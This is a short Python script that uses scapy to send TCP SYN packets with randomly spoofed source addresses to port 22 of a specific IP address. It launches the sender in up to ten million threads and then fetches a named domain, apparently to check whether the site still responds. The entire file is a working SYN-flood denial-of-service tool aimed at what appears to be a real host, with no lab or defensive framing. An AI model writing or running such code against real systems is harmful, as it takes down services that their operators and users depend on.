from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
import requests
import os

def task ():
	target="94.136.170.102"
	#target="procentriciq.com"
	tport=22
	ip=IP(src=RandIP(),dst=target)
	tcp=TCP(sport=RandShort(),dport=tport,seq=RandNum(1024,65535),flags="S")
	askTcp=ip/tcp
	send(askTcp)



threads = []
for i in range(10000000):
    thread = threading.Thread(target=task)
    threads.append(thread)
    thread.start()

num_threads = 1  # Adjust based on capacity
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = [executor.submit(task) for _ in range(num_threads)]


url = 'https://procentriciq.com'
response = requests.get(url)
print("Response data:", response.content)
response.close()
